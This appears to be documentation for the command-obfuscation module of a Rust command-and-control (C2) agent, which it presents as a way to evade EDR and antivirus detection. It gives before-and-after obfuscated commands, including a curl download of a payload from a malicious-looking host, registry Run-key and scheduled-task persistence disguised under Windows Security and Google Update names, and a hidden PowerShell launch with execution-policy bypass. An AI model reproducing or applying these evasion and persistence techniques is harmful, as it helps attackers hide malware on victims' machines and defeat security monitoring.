# Command Obfuscation Examples

## Overview
The ArgFuscator module automatically obfuscates all Windows commands executed by the C2 agent, making detection by EDR/AV systems more difficult.

## Obfuscation Techniques

### 1. Random Case Changes
Randomly changes the case of characters in commands.
- Original: `whoami`
- Obfuscated: `wHoAmI` or `WhOaMi` (varies each time)

### 2. Character Insertion (Carets)
Inserts caret (^) characters that Windows cmd.exe ignores.
- Original: `whoami`
- Obfuscated: `who^ami` or `w^h^o^a^m^i`

### 3. Quote Insertion
Adds quotes around arguments with special characters.
- Original: `curl http://example.com/file.txt`
- Obfuscated: `curl "http://example.com/file.txt"`

### 4. Environment Variable Substitution
Replaces common paths with environment variables.
- Original: `C:\Windows\System32\cmd.exe`
- Obfuscated: `%windir%\System32\cmd.exe`

## Real Examples

### Basic Command Obfuscation

#### whoami
```
Original:   whoami
Obfuscated: wH^o^A^mi
```

#### ipconfig
```
Original:   ipconfig /all
Obfuscated: iP^c^On^FiG /all
```

#### curl download
```
Original:   curl http://malicious.com/payload.exe
Obfuscated: cU^rl "http://malicious.com/payload.exe"
```

### Persistence Command Obfuscation

#### Registry Persistence
```
Original:   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealthSystray /t REG_SZ /d "cmd.exe /c start /min \"\" \"C:\path\to\agent.exe\"" /f
Obfuscated: r^eG A^d^D HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V sE^cU^rI^tY^hE^aL^tH^sY^sTrAy /t REG_SZ /d "cmd.exe /c start /min \"\" \"C:\path\to\agent.exe\"" /F
```

#### Scheduled Task
```
Original:   schtasks /Create /SC ONLOGON /TN GoogleUpdateTaskUser /TR "cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"C:\path\to\agent.exe\"" /DELAY 0001:00 /F
Obfuscated: sC^hT^aS^kS /cR^eA^tE /SC ONLOGON /TN gO^oG^lE^uP^dA^tE^tA^sK^uS^eR /TR "cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"C:\path\to\agent.exe\"" /DELAY 0001:00 /f
```

#### WMI Event
```
Original:   powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "..."
Obfuscated: pO^wE^rS^hE^lL -nO^pR^oF^iL^e -wI^nD^oW^sTyLe hI^dD^eN -eX^eC^uT^iO^nP^oL^iCy bY^pA^sS -cO^mM^aNd "..."
```

## How It Works in the C2

1. **User sends command**: `/cmd whoami` or `/cmd_all ipconfig`
2. **Server transmits**: Command sent to agent as-is
3. **Agent receives**: Command received by agent
4. **Agent obfuscates**: Before execution, agent applies obfuscation
5. **Agent executes**: Obfuscated command executed via cmd.exe
6. **Result returned**: Normal output returned to server

## Benefits

1. **AV/EDR Evasion**: Signatures based on command-line patterns are bypassed
2. **Dynamic Obfuscation**: Each execution produces different but equivalent commands
3. **Transparent**: No changes needed in server - obfuscation happens automatically
4. **Maintains Functionality**: Commands execute identically to originals
5. **APT-like Techniques**: Uses techniques seen in real-world APT operations

## Technical Details

- **Implementation**: Pure Rust, no external dependencies except `rand`
- **Location**: `agent/src/argfuscator.rs`
- **Integration**: 
  - `execute_command()` in `agent/src/main.rs`
  - Persistence methods in `agent/src/persistence.rs`
- **Configurable**: Can adjust obfuscation levels (high/medium/low)

